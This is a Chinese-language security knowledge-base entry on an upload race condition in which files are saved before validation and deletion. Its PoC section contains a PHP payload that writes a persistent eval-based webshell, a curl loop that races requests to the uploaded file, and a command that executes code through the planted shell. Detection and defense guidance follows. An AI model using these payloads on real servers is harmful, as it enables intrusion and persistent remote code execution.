---
id: web-generic-file-upload-save-then-validate-race
title: 先落盘后校验的删除竞态：上传并抢访问生成持久 WebShell
type: scenario
domain: web
path: web/generic/file-upload
technique: upload-race-condition
tags:
- web
- file-upload
- race-condition
- webshell
- php
- intruder
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-05'
verification:
  verified_by: verifier-V9
  verified_at: '2026-11-05T00:40:27+08:00'
  notes: 已对照原文与图56-61核对：先 move_uploaded_file 落盘再按白名单删除，上传与访问双 Intruder 50 线程并发后生成 xiao.php（原文文字结论，生成页为外链图未本地留存）。卡中竞态 payload 与操作流程一致，confidence=medium 合理。原文未涉及版本区间。PoC 未在本机执行。
url: /docs/web/generic/file-upload/web-generic-file-upload-save-then-validate-race/
draft: false
kb_aliases:
- 条件竞争上传
- 上传竞态
- 先上传后删除
- 竞争 webshell
- upload-labs race condition
---

## 一句话结论

上传逻辑先把文件移动到 Web 目录、再检查后缀并删除非法文件时，攻击者高频上传同时在极短窗口内访问该文件，可让脚本执行并写出一个持久 WebShell。

## 原理

- 典型代码：`move_uploaded_file($tmp, UPLOAD_PATH.$name);` 之后才 `if (!in_array($ext, $whitelist)) { unlink(UPLOAD_PATH.$name); }`。
- 文件从移动到删除之间存在一个时间窗口，期间文件以原始后缀存在于可访问目录；可执行后缀在窗口内被请求就会被 PHP 解析。
- 单次窗口很短且不稳定，但攻击者可以并行化：一个任务持续上传，另一个任务持续请求目标路径，命中一次即可执行脚本。
- 脚本本身不需要长期存活，只需执行一次并写入新的持久文件（如 `fputs(fopen('xiao.php','w'), ...)`），后续删除原临时文件已无影响。

## 触发条件

- 上传逻辑顺序为“先移动落盘，后校验/删除”，且删除前的短暂文件可被 Web 访问。
- 上传目录允许脚本解析。
- 攻击者能并发发起大量上传与访问请求。

## 利用步骤

1. 抓一个上传 `.php` 的请求，确认返回“上传失败/文件被删除”，但文件在极短时间内存在。
2. 准备“落地即自复制”的 payload：被访问时写出一个新的持久 WebShell。
3. 用 Intruder 将该上传请求重复发送（如 1–99999），并发 50 线程。
4. 同时用另一个 Intruder 高频 GET 上传目标路径（如 `/upload/y.php`），并发 50 线程。
5. 先启动上传任务，再启动访问任务；等待一段时间后访问 payload 生成的 `xiao.php`。

## PoC

竞态 payload（被访问时写出持久马）：

```php
<?php fputs(fopen('xiao.php','w'),'<?php eval($_REQUEST[1]);?>'); ?>
```

上传请求中的文件名为 `y.php`。访问侧：

```bash
while true; do curl -s 'http://target/upload/y.php' >/dev/null; done
```

上传侧用代理/脚本高并发重放 multipart。成功后访问：

```bash
curl -s 'http://target/upload/xiao.php?1=phpinfo();'
```

## 变体与关联

- 变体：删除逻辑在图片二次渲染之后（先保存原图再渲染），原图同样短暂存在，可在渲染前抢先访问；若删除是异步任务，窗口更长。
- 关联：[[web-generic-file-upload-image-render-payload-survival]]（渲染前原图短暂落盘，也构成竞态）；[[web-generic-file-upload-extension-zero-check]]（无需竞态即可落盘）。
- 边界：竞态成功依赖服务器性能、删除时机与并发度，原文用 50 线程等待约半分钟成功；不同环境可能失败，置信度定为 medium。

## 检测与防御

- 检测：同一来源短时间大量重复上传同名文件并伴随对该路径的高频 GET；Web 日志中出现刚上传即被访问的脚本；上传目录出现多个来源不明的脚本文件。
- 防御：先完成全部校验（后缀、内容、渲染）再移动文件；校验失败的文件不要放入 Web 可访问目录；使用随机临时目录并在校验后原子重命名；上传目录禁止脚本解析。
